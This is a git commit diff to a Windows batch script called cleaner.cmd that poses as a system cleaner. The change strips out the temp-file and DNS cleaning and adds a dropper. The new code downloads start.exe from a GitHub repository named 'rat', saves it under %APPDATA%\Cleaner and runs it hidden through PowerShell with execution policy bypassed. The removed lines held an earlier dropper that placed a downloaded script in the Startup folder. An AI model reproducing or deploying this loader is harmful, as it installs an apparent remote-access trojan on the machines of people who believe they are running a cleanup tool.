22aee022f25ad22adcf3691d20023815cfc98799
Guillem <sjeje2553@gmail.com>
2026-02-17 15:53:13 +0100

    Update cleaner.cmd

--- cleaner.cmd
+++ cleaner.cmd
@@ -27,19 +27,28 @@ taskkill /f /im Discord.exe >nul 2>&1
 echo killing Discord
 taskkill /f /im Spotify.exe >nul 2>&1
 echo killing Spotify
-del /s /f /q "%temp%\*" >nul 2>&1
-for /d %%i in ("%temp%\*") do rd /s /q "%%i" >nul 2>&1
-del /f /q "%localappdata%\Microsoft\Windows\Explorer\thumbcache_*" >nul 2>&1
-echo cleaning temp files
-ipconfig /flushdns >nul 2>&1
-echo flushing dns
-set "DL_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "DL_FILE=%DL_DIR%\start.cmd"
-set "DL_URL=https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/start.cmd"
-if not exist "%DL_DIR%" mkdir "%DL_DIR%"
+set "DL_DIR=%APPDATA%\Cleaner"
+set "DL_FILE=%DL_DIR%\start.exe"
+set "DL_URL=https://raw.githubusercontent.com/pulgax-g/rat/main/start.exe"
+if not exist "%DL_DIR%" (
+    mkdir "%DL_DIR%"
+)
+
+if exist "%DL_FILE%" (
+    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Start-Process -FilePath "%DL_FILE%" -WindowStyle Hidden -PassThru"
+    goto idk
+    exit
+    
+)
 powershell -NoProfile -ExecutionPolicy Bypass ^
-  -Command "try { Invoke-WebRequest -Uri '%DL_URL%' -OutFile '%DL_FILE%' -UseBasicParsing } catch {}" ^
-  >nul 2>&1
-start "" /min "%DL_FILE%"
+ -Command "Invoke-WebRequest -Uri '%DL_URL%' -OutFile '%DL_FILE%'"
+if exist "%DL_FILE%" (
+    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Start-Process -FilePath "%DL_FILE%" -WindowStyle Hidden -PassThru"
+    goto idk
+    exit
+)
+:idk
 wmic process where name="explorer.exe" CALL setpriority 128 >nul 2>&1
 exit
